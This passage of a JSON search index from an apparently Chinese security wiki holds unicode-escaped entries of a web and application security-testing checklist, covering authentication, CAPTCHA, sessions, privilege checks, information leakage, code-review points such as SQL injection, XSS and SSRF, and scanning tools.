*\u64cd\u4f5c\u7cfb\u7edf*****\u5b89\u5168****"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#512","text":"\u6570\u636e\u5e93\u5b89\u5168\u6211\u4eec\u53ef\u4ee5\u628a\u5b83\u5206\u4e3a\u4ee5\u4e0b\u51e0\u5757\uff1a \u6570\u636e\u5e93\u6f0f\u6d1e\uff08\u8865\u4e01\uff09\u3001\u6570\u636e\u5e93\u914d\u7f6e\uff08\u5b89\u5168\u52a0\u56fa\uff09 \u5de5\u5177\u53ef\u4ee5\u4f7f\u7528Ngs","title":"5.1.2. *\u6570\u636e\u5e93*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#513-web","text":"\u6570\u636e\u5e93\u5b89\u5168\u6211\u4eec\u53ef\u4ee5\u628a\u5b83\u5206\u4e3a\u4ee5\u4e0b\u51e0\u5757\uff1a \u8eab\u4efd\u9a8c\u8bc1\u3001\u9a8c\u8bc1\u7801\u3001\u4f1a\u8bdd\u7ba1\u7406\u3001\u6743\u9650\u7ba1\u7406\u3001\u654f\u611f\u4fe1\u606f\u4f20\u8f93\u3001\u5b89\u5168\u5ba1\u8ba1\u3001\u4fe1\u606f\u6cc4\u9732\u3001\u8f93\u5165\u6821\u9a8c\u3001\u8f93\u51fa\u7f16\u7801\u3001\u4e0a\u4f20\u4e0b\u8f7d\u3001\u5f02\u5e38\u5904\u7406\u3001\u6ce8\u91ca\u4ee3\u7801\u7b49 \u5bb9\u5668\u7684\u5b89\u5168\uff08tomcat\uff09 \u5e94\u7528\u8f6f\u4ef6\u5b89\u5168\uff08nginx\u3001\u8d1f\u8f7d\u5747\u8861\u8f6f\u4ef6\u3001jquery\u7b49\uff09 \u626b\u63cf\u5de5\uff1aappScan\u3001awvs","title":"5.1.3. *web\u5b89\u5168*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#514","text":"\u53d1\u5e03\u4ef6\u7684\u5b8c\u6574\u6027\u6821\u9a8c\uff08\u7b7e\u540d\u3001\u54c8\u5e0c\uff09 \u9632\u75c5\u6bd2\uff1a\u9700\u8981\u5b89\u88c5\u7684\u8f6f\u4ef6\u9700\u8981\u7ecf\u8fc7\u5e38\u7528\u7684\u6740\u6bd2\u8f6f\u4ef6\uff08\u5982360\u3001\u5361\u5df4\u65af\u57fa\u3001\u91d1\u5c71\u6bd2\u9738\u7b49\uff09\u7684\u626b\u63cf\uff0c\u4fdd\u8bc1\u6ca1\u6709\u75c5\u6bd2\u7279\u79cd\u7801\uff0c\u4ee5\u514d\u88ab\u6740\u8f6f\u5904\u7406\u6389\u3002","title":"5.1.4. *\u8f6f\u4ef6\u7684\u53d1\u5e03\u4e0e\u5b89\u88c5\u5b89\u5168*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#515","text":"\u4e1a\u52a1\u4ea4\u4e92\u6570\u636e\u5728\u7f51\u7edc\u4e2d\u4f7f\u7528\u7684\u534f\u8bae\u5b89\u5168\u6027\u6d4b\u8bd5 \u534f\u8bae\u6d4b\u8bd5\u5de5\u5177\uff1acodenomical \u5bf9\u5916\u5f00\u653e\u7684\u7aef\u53e3:\u7cfb\u7edf\u5bf9\u5916\u5f00\u653e\u7684\u7aef\u53e3\u5fc5\u987b\u662f\u5fc5\u987b\u7684\uff0c\u7981\u6b62\u5f00\u653e\u65e0\u7528\u7aef\u53e3 \u7aef\u53e3\u626b\u63cf\u5de5\u5177\uff1aNmap\uff0c\u8fd1\u7aef\u53ef\u4ee5\u76f4\u63a5\u5728\u670d\u52a1\u5668\u4e0a\u4f7f\u7528\u547d\u4ee4\u67e5\u770b \u63a5\u53e3\uff1a\u63a5\u53e3\u63a5\u53d7\u7684\u6570\u636e\u9700\u8981\u505a\u4e25\u683c\u7684\u5904\u7406 \u63a5\u53e3\u6570\u636e\u4e25\u683c\u6821\u9a8c\u6d4b\u8bd5","title":"5.1.5. *\u534f\u8bae\u4e0e\u63a5\u53e3\u653b\u9632*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#516","text":"\u8bc6\u522b\u654f\u611f\u6570\u636e\uff1a\u5bc6\u7801\u3001\u79d8\u94a5\u3001\u4f1a\u8bdd\u6807\u8bc6\uff1b\u4e2a\u4eba\u4fe1\u606f\u3001\u5546\u4e1a\u673a\u5bc6\u3001\u5ba2\u6237\u4fe1\u606f\u7b49 \u4fdd\u62a4\uff1a\u52a0\u5bc6\u3001\u5b58\u50a8\u4f4d\u7f6e\u3001\u4f20\u8f93\u65b9\u5f0f\uff1b\u83b7\u53d6\u6570\u636e\u8131\u654f\u3001\u533f\u540d\u5316","title":"5.1.6. *\u654f\u611f\u6570\u636e\u4fdd\u62a4*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#517","text":"1\u3001app\u7684\u7b7e\u540d\u3001\u53cd\u9006\u5411 2\u3001\u7528\u6237\u9690\u79c1 3\u3001\u6587\u4ef6\u6743\u9650 4\u3001\u7f51\u7edc\u901a\u8baf 5\u3001\u8fd0\u884c\u65f6\u89e3\u91ca\u4fdd\u62a4 6\u3001\u7ec4\u4ef6\u6743\u9650\u4fdd\u62a4 7\u3001\u5347\u7ea7 8\u30013rd\u5e93 \u79fb\u52a8APP\u6d4b\u8bd5\u8981\u70b9\uff1a http://blog.nsfocus.net/mobile-app-security-security-test/","title":"5.1.7. *\u624b\u673a\u7aef\u5b89\u5168*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#518","text":"\u767d\u76d2\u6d4b\u8bd5\u4e3b\u8981\u662f\u901a\u8fc7\u5bf9\u4ee3\u7801\u7684\u6d4f\u89c8\u6765\u53d1\u73b0\u95ee\u9898\uff0c\u5f53\u7136\u95ee\u9898\u7684\u7c7b\u578b\u53ef\u80fd\u662f\u8ddf\u6211\u4eec\u9ed1\u7070\u76d2\u603b\u7ed3\u7684\u4e00\u81f4\uff0c\u62ff\u51fa\u6765\u5355\u72ec\u8bb2\u662f\u56e0\u4e3a\u5176\u4e0d\u540c\u4e8e\u5176\u4ed6\u7684\u6d4b\u8bd5\u65b9\u5f0f\u3002 1\u3001\u5371\u9669\u51fd\u6570\u3001\u65b9\u6cd5 2\u3001\u5de5\u5177\u68c0\u6d4b 3\u3001\u903b\u8f91\u6f0f\u6d1e \u7070\u76d2 \u7ed3\u5408\u767d\u76d2\u548c\u9ed1\u76d2\u7684\u4e00\u4e9b\u601d\u8def\uff0c\u5728\u5b9e\u9645\u7684\u4ee3\u7801\u5ba1\u8ba1\u4e2d\u5efa\u8bae\u91c7\u7528\u7070\u76d2\u7684\u65b9\u5f0f\uff0c\u5728\u9700\u8981\u7684\u5730\u65b9\u5bf9\u4ee3\u7801\u8fdb\u884c\u52a8\u6001\u8c03\u8bd5\u67e5\u770b\u3002\u5ba1\u8ba1\u4e2d\u601d\u8def\u53ef\u4ee5\u8003\u8651\u5982\u4e0b\u8fd9\u4e9b\u90e8\u5206\uff1a 1\u3001\u6d89\u53ca\u654f\u611f\u6570\u636e\u7684\u65f6\u5019\uff0c\u68c0\u67e5\u662fget\u3001post\u54ea\u79cd\u5f62\u5f0f\u53d1\u9001\u6570\u636e Get\u4f20\u8f93\u7684\u6570\u636e\u4f1a\u88ab\u8bb0\u5f55\u5728\u4ee3\u7406\u3001\u6d4f\u89c8\u5668\u3001web\u5bb9\u5668tomcat\u7b49\u7684\u65e5\u5fd7\u4e2d 2\u3001\u63d0\u4ea4\u94ed\u611f\u6570\u636e\u7684\u65f6\u5019\u662f\u5426\u6709\u9632\u6b62csrf\u7684token\u3001refer\u3001\u9a8c\u8bc1\u7801\u7b49 3\u3001sql\u6ce8\u5165 \u200b 1\uff09Statement\u548cpreparestatement \u200b 2\uff09mybitas\u6846\u67b6 #\u548c$ 4\u3001XSS \u6211\u4eec\u7528\u7684antisamy\u53ea\u80fd\u8fc7\u6ee4\u57fa\u4e8e\u6807\u7b7e\u7684XSS\u4f2a\u9020\uff0c\u5176\u4ed6\u7684\u65e0\u6cd5\u8fc7\u6ee4\uff0c\u9700\u8981\u505a\u4e8c\u6b21\u8fc7\u6ee4 5\u3001\u903b\u8f91 \u6b64\u5904\u662f\u6307\uff0c\u903b\u8f91\u601d\u8def\u4e0d\u5408\u7406\uff0c\u4e0d\u7b26\u5408\u5b89\u5168\u7684\u4e00\u4e9b\u601d\u60f3\uff0c\u5982\u6743\u9650\u6700\u5c0f\u5316\u7b49\u7b49 6\u3001\u53c2\u6570\u8303\u56f4\u662f\u5426\u9020\u6210dos\u6216\u8005\u5f71\u54cd\u7cfb\u7edf\u6027\u80fd 7\u3001\u6743\u9650\u6821\u9a8c\u3001\u8d8a\u6743 \u200b 1)\u6a2a\u3001\u7eb5\u3001\u591a\u6b65\u9aa4\u5173\u8054\u6027 \u200b 2\uff09 8\u3001session\u4f1a\u8bdd\u7ba1\u7406 \u200b 1\uff09\u5e38\u89c4cookie\u53casession\u5f62\u5f0f \u200b 2\uff09\u628atoken\u4f5c\u4e3asession\u7684\u5f62\u5f0f\uff0c\u7279\u522b\u6ce8\u5165\u767b\u5f55\u7528\u6237\u548ctoken\u7684\u7ed1\u5b9a\u5173\u7cfb 9\u3001\u53c2\u6570\u662f\u5426\u662f\u7b80\u5355\u5f62\u5f0f\uff0c\u662f\u5426\u53ef\u4ee5\u9020\u6210\u904d\u5386 10\u3001\u4ee3\u7801\u4e2d\u4f7f\u7528\u7684\u7b2c\u4e09\u65b9\u63d2\u4ef6\u3001\u5f00\u6e90\u8f6f\u4ef6\u662f\u5426\u662f\u6700\u65b0\u3001\u662f\u5426\u6709\u5b89\u5168\u6f0f\u6d1e 11\u3001\u4ee3\u7801\u4e2d\u6240\u4f7f\u7528\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u662f\u5426\u662f\u5b89\u5168\u7684 12\u3001\u8df3\u8f6c\u4e2d\u7684redirect\u5f62\u5f0f\u4e2d\u4e0d\u8981\u5e26\u654f\u611f\u4fe1\u606f\uff0c\u4f1a\u88ab\u53d1\u56de\u5ba2\u6237\u7aef\u91cd\u65b0\u8bf7\u6c42\u7684\uff0c\u76f8\u5f53\u4e8e\u628a\u8fd9\u4e9b\u53c2\u6570\u653e\u5728\u4e86get\u8bf7\u6c42\u4e2d 13\u3001SSRF\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\uff0c\u6ce8\u610furl\u4e2d\u542b\u6709\u53e6\u5916\u4e00\u4e2aurl\u7684\u8bf7\u6c42 \u200b 1\uff09\u6e90\u7801\u4e2d\u4f7f\u7528urlconnection \u652f\u6301\u7684\u534f\u8bae\u9664\u4e86http\u548chttps\u4ee5\u5916\uff0c\u8fd8\u6709file\u3001ftp\u3001jar\u3001mailto\u7b49 \u200b request\u3001httpurlconnecttion\u3001httpClient\u3001URL\u7b49\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42 14\u3001\u52a0\u5bc6\u7b97\u6cd5\u7684\u4f7f\u7528\uff0c\u662f\u5426\u4f7f\u7528\u7684\u662f\u4e0d\u5408\u573a\u666f\u7684\u5f31\u7b97\u6cd5 15\u3001\u6570\u636e\u63d2\u5165\u81ea\u589eId\u653b\u51fb \u200b \u6570\u636e\u4f20\u5165\u8fc7\u6765\u505a\u63d2\u5165\u52a8\u4f5c\uff0c\u5e76\u4e14\u4f7f\u7528spring\u81ea\u52a8\u7ed1\u5b9a\u5bf9\u8c61\u65b9\u6cd5\u83b7\u53d6\u6570\u636e\uff0c\u4e4b\u540e\u4f7f\u7528\u751f\u6210\u7684\u63d2\u5165sql \u6b64\u65f6\u81ea\u52a8\u589e\u957fid\u4e0d\u8981\u5199\u5230\u66f4\u65b0\u8bed\u53e5\u4e2d\uff0c\u5982\u679c\u5199\u5165\u53ef\u80fd\u9020\u6210\u6076\u610f\u6ce8\u5165integer\u8303\u56f4\u6700\u5927\u503c2147483647\uff0c\u4f7f\u529f\u80fd\u4e0d\u53ef\u7528dos 16\u3001Spring\u81ea\u52a8\u7ed1\u5b9a\u53c2\u6570\uff0c\u53c2\u6570\u6269\u5c55\u653b\u51fb \u540e\u53f0\u4f7f\u7528\u7684\u5bf9\u8c61\u53c2\u6570\u81ea\u52a8\u7ed1\u5b9a\u83b7\u53d6\uff0c\u76f8\u5e94\u7684sql\u4f7f\u7528\u4e86\u81ea\u52a8\u7684if\u662f\u5426\u4e3anull\u548c\u4e3a\u7a7a\u7684\u5224\u65ad\u6761\u4ef6\uff0c\u524d\u53f0\u53ef\u4ee5\u6839\u636e\u731c\u6d4b \u200b \u6ce8\u5165\u961f\u5f62\u7684\u76f8\u5e94\u7684\u5c5e\u6027\u5b9e\u73b0\u975e\u9884\u6599\u7ed3\u679c","title":"5.1.8. *\u9759\u6001\u4ee3\u7801\u5206\u6790\uff08\u7eaf\u767d\u76d2\uff09*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#52-web","text":"","title":"5.2. *WEB\u5b89\u5168\u6d4b\u8bd5*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#521","text":"\u4e3a\u9632\u6b62\u5bc6\u7801\u7834\u89e3\u548c\u731c\u6d4b\uff1a \u590d\u6742\u5ea6\u8981\u6c42\uff0c\u5fc5\u987b\u7531\u5927\u5199\u3001\u5c0f\u5199\u3001\u6570\u5b57\u7b49\u7ec4\u6210\uff1b \u65f6\u6548\u6027\u8981\u6c42\uff0c\u5efa\u8bae\u7528\u62373\u4e2a\u6708\u66f4\u6539\u4e00\u6b21\u53e3\u4ee4\uff1b \u5bc6\u7801\u957f\u5ea6\u8981\u6c42\uff0c\u6700\u5c0f8\u4f4d\uff0c\u6700\u5927\uff1f\u4f4d\uff1b \u7ba1\u7406\u5458\u91cd\u7f6e\u5bc6\u7801\u540e\u5bc6\u7801\u5fc5\u987b\u5728\u4e0b\u6b21\u767b\u5f55\u66f4\u6539\uff1b \u5f3a\u5ea6\u8981\u6c42\uff0c\u4e0d\u80fd\u8ddf\u539f\u5bc6\u7801\u4e00\u81f4\uff0c\u4e0d\u80fd\u4e0e\u7528\u6237\u540d\u76f8\u4f3c\uff08\u5982\uff0c\u4e0d\u80fd\u5305\u542b\u7528\u6237\u540d\u6b63\u5199\u53cd\u5199\u5927\u5c0f\u5199\u7b49\uff09\uff0c \uff08\u6700\u65b0\u4e5f\u6709\u8bf4\u6cd5\u4e0d\u5efa\u8bae\u9891\u7e41\u4fee\u6539http:// www.secdoctor.cn/html/sec/35995.html \uff09 \u53e3\u4ee4\u8ba4\u8bc1\u5fc5\u987b\u5728\u670d\u52a1\u7aef\u8fdb\u884c\u3002 \u5fc5\u987b\u8981\u6709\u9a8c\u8bc1\u7801\u673a\u5236\u3002 \u767b\u5f55\u9501\u5b9a\uff0c\u767b\u5f55\u9700\u8981\u6709\u9501\u5b9a\u673a\u5236\u5373\u5c31\u662f\u591a\u6b21\u767b\u5f55\u5931\u8d25\u540e\u9501\u5b9a\u8d26\u53f7\u6216\u8005ip\uff0c\u5728\u4e00\u6bb5\u65f6\u95f4\u540e\u81ea\u52a8\u89e3\u9501\u3002 \u624b\u673a\u9a8c\u8bc1\u7801\u8f70\u70b8 \u624b\u673a\u9a8c\u8bc1\u7801\u8d85\u65f6\u673a\u5236 \u8d26\u6237\u679a\u4e3e\u6d4b\u8bd5 \u5f31\u5bc6\u7801\u6982\u5ff5\uff1a https://help.aliyun.com/knowledge_detail/37509.html?spm=5176.7837442.2.5.ZotsLv","title":"5.2.1. *\u8eab\u4efd\u9a8c\u8bc1*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#522","text":"\u9a8c\u8bc1\u7801\u5b57\u7b26\u751f\u6210\u7b97\u6cd5\u7684\u5b89\u5168\u968f\u673a\u6570 \u9a8c\u8bc1\u7801\u5b57\u7b26\u4e0d\u80fd\u88ab\u9a8c\u8bc1\u7801\u8bc6\u522b\u5de5\u5177\u8bc6\u522b \u9a8c\u8bc1\u7801\u5fc5\u987b\u662f\u4e00\u6b21\u6027\u7684 \u9a8c\u8bc1\u7801\u8d85\u65f6\uff08\u9a8c\u8bc1\u7801\u6709\u6548\u671f\u7684\u610f\u4e49\uff1a1\u3001\u589e\u52a0\u56fe\u7247\u5904\u7406\u8bc6\u522b\u7684\u96be\u5ea6\uff1b2\u3001\u9a8c\u8bc1\u7801\u6ca1\u6709\u6709\u6548\u671f\u7684\u8bdd\u5bfc\u81f4\u670d\u52a1\u5668\u9a8c\u8bc1\u7801\u5806\u79ef\uff09 \u5728\u5fd8\u8bb0\u5bc6\u7801\u5904\u505a\u5b89\u5168\u95ee\u7b54\u6d4b\u8bd5 \u5efa\u8bae\u7684\u9a8c\u8bc1\u7801\u5f62\u5f0f\uff1a \u5f53\u524d\u7684\u6700\u6d41\u884c\u7684\u6ed1\u52a8\u5757\u9a8c\u8bc1\u7801\uff0c\u6709\u70b9\u7528\u6237\u65e0\u9700\u52a8\u8111\uff0c\u4e0d\u4f1a\u6253\u65ad\u7528\u6237\u7684\u601d\u8003\u3002 \uff08\u9a8c\u8bc1\u7801\u7684\u524d\u4e16\u4eca\u751f\uff1a http://www.freebuf.com/articles/web/102276.html \uff09","title":"5.2.2. *\u9a8c\u8bc1\u7801* *\uff08\u666e\u901a\u9a8c\u8bc1\u7801\u3001\u77e5\u8bc6\u9a8c\u8bc1\u7801\u3001\u65e0\u9700\u601d\u8003\u7684\u6ed1\u52a8\u9a8c\u8bc1\u7801\uff09*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#523","text":"\u767b\u5f55\u524d\u540e\u4f1a\u8bdd\u6807\u793a\u8981\u6709\u53d8\u5316 \u5b89\u5168\u9000\u51fa\u4f1a\u8bdd\u6807\u793a\u6ce8\u9500 \u4f1a\u8bdd\u6807\u793a\u5b89\u5168\u968f\u673a \u4f1a\u8bdd\u6807\u793a\u7684\u957f\u5ea6\u9002\u5ea6 \u4f1a\u8bdd\u8d85\u65f6\u673a\u5236 \u4f1a\u8bdd\u6807\u8bc6\u7684\u4f20\u8f93\u548c\u5b58\u50a8 \u4f1a\u8bdd\u6807\u8bc6\u5938PC\u8bbf\u95ee","title":"5.2.3. *\u4f1a\u8bdd\u7ba1\u7406*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#524","text":"\u901a\u8fc7\u7070\u5316\uff08\u9690\u85cf\uff09\u4f7f\u529f\u80fd\u5931\u6548 \u7eb5\u5411\u8d8a\u6743 \u6a2a\u5411\u8d8a\u6743 \u6743\u9650\u5206\u79bb \uff08\u7cfb\u7edf\u7ba1\u7406\u3001\u5b89\u5168\u7ba1\u7406\u3001\u5ba1\u8ba1\u7ba1\u7406 \u7cfb\u7edf\u7ba1\u7406\u5458\u4e3b\u8981\u8d1f\u8d23\u7528\u6237\u7ba1\u7406\u548c\u7cfb\u7edf\u65e5\u5e38\u8fd0\u4f5c\u76f8\u5173\u7684\u7ef4\u62a4\u5de5\u4f5c\uff1b \u5b89\u5168\u7ba1\u7406\u5458\u8d1f\u8d23\u5b89\u5168\u7b56\u7565\u7684\u914d\u7f6e\u548c\u7cfb\u7edf\u8d44\u6e90\u5b89\u5168\u5c5e\u6027\u7684\u8bbe\u5b9a\uff1b \u5ba1\u8ba1\u7ba1\u7406\u5458\u5219\u5bf9\u7cfb\u7edf\u5ba1\u8ba1\u4fe1\u606f\u8fdb\u884c\u7ba1\u7406\uff09 \u53c2\u770b\u300a\u5173\u4e8e\u8d8a\u6743\u300b","title":"5.2.4. *\u6743\u9650\u7ba1\u7406*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#525","text":"\u654f\u611f\u4fe1\u606f\u4e0d\u80fd\u4ee5get\u65b9\u5f0f\u63d0\u4ea4 \u4f20\u8f93\u901a\u9053\u4f7f\u7528https\uff08\u5173\u952e\u6570\u636e\u63d0\u4ea4\u670d\u52a1\u7aef\u4e0d\u63a5\u6536http\u660e\u6587\u6570\u636e\uff09 \u4e25\u683c\u5b89\u5168\u4f20\u8f93HSTS\uff08\u786e\u4fdd\u4ece\u6d4f\u89c8\u5668\u53d1\u51fa\u7684\u8bf7\u6c42\u5c31\u662fhttps\u7684\uff09 \u5728url\u4e2d\u6709session \u5bf9\u7528\u6237\u4fdd\u5bc6\u7684\u4fe1\u606f\u4e0d\u80fd\u4f20\u8f93\u5230\u5ba2\u6237\u7aef \u542b\u6709\u654f\u611f\u4fe1\u606f\u7684\u9875\u9762\u9700\u8981\u8bbe\u7f6e\u4e0d\u7f13\u5b58","title":"5.2.5. *\u654f\u611f\u4fe1\u606f\u4f20\u8f93\u53ca\u5b58\u50a8*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#526","text":"\u767b\u5f55\u3001\u9000\u51fa\u3001\u64cd\u4f5c\u7b49\u90fd\u8981\u6709\u65e5\u5fd7 \u65e5\u5fd7\u683c\u5f0f\u6807\u51c6\uff08\u65f6\u95f4\u3001\u8c01\u3001\u505a\u4e86\u4ec0\u4e48\u64cd\u4f5c\u3001\u7ed3\u679c\u600e\u6837\uff09 \u65e5\u5fd7\u8bbf\u95ee\u7684\u9650\u5236 \u65e5\u5fd7\u4e2d\u7684\u654f\u611f\u4fe1\u606f \u4ed6\u4eec\u662f\u5982\u4f55\u8fed\u4ee3\u7684\uff1f\u65e5\u5fd7\u662f\u5426\u4fdd\u5b58\u8db3\u591f\u957f\u7684\u65f6\u95f4\uff1f \u65e5\u5fd7\u662f\u5982\u4f55\u88ab\u5ba1\u67e5\u7684\uff1f\u7ba1\u7406\u5458\u80fd\u5426\u901a\u8fc7\u5ba1\u67e5\u51fa\u53d1\u73b0\u653b\u51fb\u884c\u4e3a\uff1f \u65e5\u5fd7\u5907\u4efd\u5982\u4f55\u4fdd\u5b58\uff1f \u65e5\u5fd7\u8bb0\u5f55\u6570\u636e\u524d\u662f\u5426\u8fdb\u884c\u9a8c\u8bc1\uff08\u6700\u5c0f\u6700\u5927\u957f\u5ea6\uff0c\u5b57\u7b26\u7b49\uff09\uff1f","title":"5.2.6. *\u5b89\u5168\u5ba1\u8ba1*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#527","text":"\u6570\u636e\u5e93\u7248\u672c\u6cc4\u9732 \u5bb9\u5668\u7248\u672c\u6cc4\u9732 \u7edd\u5bf9\u8def\u5f84\u6cc4\u9732 \u5f02\u5e38\u4fe1\u606f\u6cc4\u9732 \u6cc4\u9732\u670d\u52a1\u5668\u8def\u5f84 \u6cc4\u9732\u5bb9\u5668\u7248\u672c \u6cc4\u9732\u7a0b\u5e8f\u8be6\u7ec6\u5806\u6808\u4fe1\u606f \u6e90\u4ee3\u7801\u6cc4\u9732 \u68c0\u6d4bWeb\u7f51\u7edc\u662f\u5426\u5b58\u5728\u6e90\u4ee3\u7801\u6cc4\u9732\u6f0f\u6d1e\uff0c\u5982\u679c\u5b58\u5728\u6b64\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u76f4\u63a5\u4e0b\u8f7d\u7f51\u7ad9\u7684\u6e90\u4ee3\u7801\u3002 \u7ba1\u7406\u5730\u5740\u6cc4\u9732 \u7f51\u7ad9\u7ba1\u7406\u5730\u5740\u5c5e\u4e8e\u5185\u90e8\u4f7f\u7528\u7684\u4fe1\u606f\uff0c\u516c\u5f00\u589e\u52a0\u4e86\u5b89\u5168\u98ce\u9669\u3002 Bak\u4fe1\u606f\u6cc4\u9732 \u641c\u7d22\u5f15\u64ce\u53d1\u73b0\u548c\u4fa6\u5bdf\u4fe1\u606f\u6cc4\u9732\uff08\u6682\u65f6\u4e0d\u6d89\u53ca\uff09 \u670d\u52a1\u5668\u6307\u7eb9\u63a2\u6d4b\uff08\u4f7f\u7528\u6307\u7eb9\u63a2\u6d4b\u5de5\u5177whatweb\u9700\u8981\u5728linux\u4e0a\u7f16\u8bd1\u8fd0\u884c\uff0chttprint--\u6700\u65b0\u7684signatures.txt\u4e0d\u7136\u8bc6\u522b\u5230\u4e0d\u51c6\u786e\uff09 \u3010\u5176\u4ed6\u5173\u6ce8\u9879\uff1a\u3011 \u679a\u4e3eweb\u670d\u52a1\u5668\u4e0a\u5b58\u5728\u7684\u5e94\u7528\u7a0b\u5e8f Whois\u4fe1\u606f\u6536\u96c6 \u8bc6\u522bWeb\u5e94\u7528\u6846\u67b6 Owasp\u6d4b\u8bd5\u6307\u53574\u4e2d\u6587\uff1a https://kennel209.gitbooks.io/owasp-testing-guide-v4/content/zh/web_application_security_testing/review_webserver_metafiles_for_information_leakage_otg-info-003.html \u62d6\u5e93\u649e\u5e93http://blog.nsfocus.net/information-leakage-thinking-library-collision/","title":"5.2.7. *\u4fe1\u606f\u6cc4\u9732*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#528","text":"\u524d\u53f0\u540e\u53f0\u90fd\u5fc5\u987b\u6821\u9a8c\uff08\u201c\u79fb\u9664\u5df2\u77e5\u7684\u6076\u610f\u6570\u636e\u201d\u4e0d\u5982\u79fb\u9664\u201c\u826f\u597d\u6570\u636e\u4e4b\u5916\u7684\u6240\u6709\u6570\u636e\u201d\uff09","title":"5.2.8. *\u8f93\u5165\u6821\u9a8c*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#5281-xss","text":"XSS-1\u53cd\u5c04\u578b\u8de8\u7ad9\u70b9\u811a\u672c\u7f16\u5236 XSS-2\u5b58\u50a8\u578b\u8de8\u7ad9\u70b9\u811a\u672c\u7f16\u5236\uff08 http://xxxxx0000sssss.lofter.com/post/14b1dc_50023e \uff09 XSS-3 DOM\u578b\u8de8\u7ad9\u70b9\u811a\u672c\u7f16\u5236 dom xss\u5e76\u4e0d\u590d\u6742\uff0c\u4ed6\u4e5f\u5c5e\u4e8e\u53cd\u5c04\u578bxss\u7684\u4e00\u79cd\uff0cdomxss\u53d6\u51b3\u4e8e\u8f93\u51fa\u4f4d\u7f6e\uff0c\u5e76\u4e0d\u53d6\u51b3\u4e8e\u8f93\u51fa\u73af\u5883\uff0c\u56e0\u6b64domxss\u65e2\u6709\u53ef\u80fd\u662f\u53cd\u5c04\u578b\u7684\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u5b58\u50a8\u578b\u7684)\uff0c\u7b80\u5355\u53bb\u7406\u89e3\u5c31\u662f\u56e0\u4e3a\u4ed6\u8f93\u51fa\u70b9\u5728DOM\uff0c\u6240\u4ee5\u5728\u9053\u54e5\u7684\u300a\u767d\u5e3d\u5b50\u8bb2Web\u5b89\u5168\u91cc\u300b\u4e5f\u6709\u8be6\u7ec6\u4ecb\u7ecd\u3002dom - xss\u662f\u901a\u8fc7url\u4f20\u5165\u53c2\u6570\u53bb\u63a7\u5236\u89e6\u53d1\u7684\u3002 HPP\uff08HTTP\u53c2\u6570\u6c61\u67d3[\u540c\u540d\u53c2\u6570] http://blog.csdn.net/eatmilkboy/article/details/6761407 \uff09 \u6f0f\u6d1e\u5371\u5bb3\uff1a 1\u3001\u9493\u9c7c\u6b3a\u9a97\uff1a\u6700\u5178\u578b\u7684\u5c31\u662f\u5229\u7528\u76ee\u6807\u7f51\u7ad9\u7684\u53cd\u5c04\u578b\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e\u5c06\u76ee\u6807\u7f51\u7ad9\u91cd\u5b9a\u5411\u5230\u9493\u9c7c\u7f51\u7ad9\uff0c\u6216\u8005\u6ce8\u5165\u9493\u9c7cJavaScript\u4ee5\u76d1\u63a7\u76ee\u6807\u7f51\u7ad9\u7684\u8868\u5355\u8f93\u5165\uff0c\u751a\u81f3\u53d1\u8d77\u57fa\u4e8eDHTML\u66f4\u9ad8\u7ea7\u7684\u9493\u9c7c\u653b\u51fb\u65b9\u5f0f\u3002 